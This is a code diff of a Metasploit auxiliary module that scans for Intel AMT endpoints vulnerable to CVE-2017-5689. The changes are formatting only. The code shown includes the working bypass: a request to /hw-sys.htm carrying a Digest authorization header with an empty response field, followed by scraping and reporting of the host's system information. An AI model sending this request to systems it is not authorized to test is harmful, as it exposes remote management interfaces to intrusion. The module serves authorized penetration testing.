@@ -3,35 +3,33 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
 
   def initialize
     super(
-      'Name'        => 'Intel AMT Digest Authentication Bypass Scanner',
+      'Name' => 'Intel AMT Digest Authentication Bypass Scanner',
       'Description' => %q{
         This module scans for Intel Active Management Technology endpoints and attempts
         to bypass authentication using a blank HTTP digest (CVE-2017-5689). This service
         can be found on ports 16992, 16993 (tls), 623, and 624 (tls).
       },
-      'Author'      => 'hdm',
-      'License'     => MSF_LICENSE,
-      'References'  =>
-        [
-          [ 'CVE', '2017-5689' ],
-          [ 'URL', 'http://web.archive.org/web/20191225124314/https://www.embedi.com/news/what-you-need-know-about-intel-amt-vulnerability' ],
-          [ 'URL', 'http://web.archive.org/web/20250208090258/https://www.intel.com/content/www/us/en/security-center/default.html?intelid=INTEL-SA-00075' ],
-        ],
+      'Author' => 'hdm',
+      'License' => MSF_LICENSE,
+      'References' => [
+        [ 'CVE', '2017-5689' ],
+        [ 'URL', 'http://web.archive.org/web/20191225124314/https://www.embedi.com/news/what-you-need-know-about-intel-amt-vulnerability' ],
+        [ 'URL', 'http://web.archive.org/web/20250208090258/https://www.intel.com/content/www/us/en/security-center/default.html?intelid=INTEL-SA-00075' ],
+      ],
       'DisclosureDate' => 'May 05 2017'
     )
 
     register_options(
       [
         Opt::RPORT(16992),
-      ])
+      ]
+    )
   end
 
   # Fingerprint a single host
@@ -58,14 +56,15 @@ class MetasploitModule < Msf::Auxiliary
 
       res = send_request_raw(
         {
-          'uri'     => '/hw-sys.htm',
-          'method'  => 'GET',
+          'uri' => '/hw-sys.htm',
+          'method' => 'GET',
           'headers' => {
             'Authorization' =>
               "Digest username=\"admin\", realm=\"#{realm}\", nonce=\"#{nonce}\", uri=\"/hw-sys.htm\", " +
               "cnonce=\"#{cnonce}\", nc=1, qop=\"auth\", response=\"\""
           }
-        })
+        }
+      )
 
       unless res && res.body.to_s.index("Computer model")
         vprint_error("#{ip}:#{rport} - AMT service does not appear to be vulnerable")
@@ -75,15 +74,16 @@ class MetasploitModule < Msf::Auxiliary
       proof = res.body.to_s
       proof_hash = nil
 
-      info_keys = res.body.scan(/<td class=r1><p>([^\<]+)(?:<\/p>)?/).map{|x| x.first.to_s.gsub("&#x2F;", "/") }
+      info_keys = res.body.scan(/<td class=r1><p>([^\<]+)(?:<\/p>)?/).map { |x| x.first.to_s.gsub("&#x2F;", "/") }
       if info_keys.length > 0
         proof_hash = {}
         proof = ""
 
-        info_vals = res.body.scan(/<td class=r1>([^\<]+)</).map{|x| x.first.to_s.gsub("&#x2F;", "/") }
+        info_vals = res.body.scan(/<td class=r1>([^\<]+)</).map { |x| x.first.to_s.gsub("&#x2F;", "/") }
         info_keys.each do |ik|
           iv = info_vals.shift
           break unless iv
+
           proof_hash[ik] = iv
           proof << "#{iv}: #{ik}\n"
         end
@@ -92,22 +92,21 @@ class MetasploitModule < Msf::Auxiliary
       print_good("#{ip}:#{rport} - Vulnerable to CVE-2017-5689 #{proof_hash.inspect}")
 
       report_note(
-        :host  => ip,
+        :host => ip,
         :proto => 'tcp',
-        :port  => rport,
-        :type  => 'intel.amt.system_information',
-        :data  => proof_hash
+        :port => rport,
+        :type => 'intel.amt.system_information',
+        :data => proof_hash
       )
 
       report_vuln({
-        :host  => rhost,
-        :port  => rport,
+        :host => rhost,
+        :port => rport,
         :proto => 'tcp',
-        :name  => "Intel AMT Digest Authentication Bypass",
-        :refs  => self.references,
+        :name => "Intel AMT Digest Authentication Bypass",
+        :refs => self.references,
         :info => proof
       })
-
     rescue ::Timeout::Error, ::Errno::EPIPE
     ensure
       disconnect
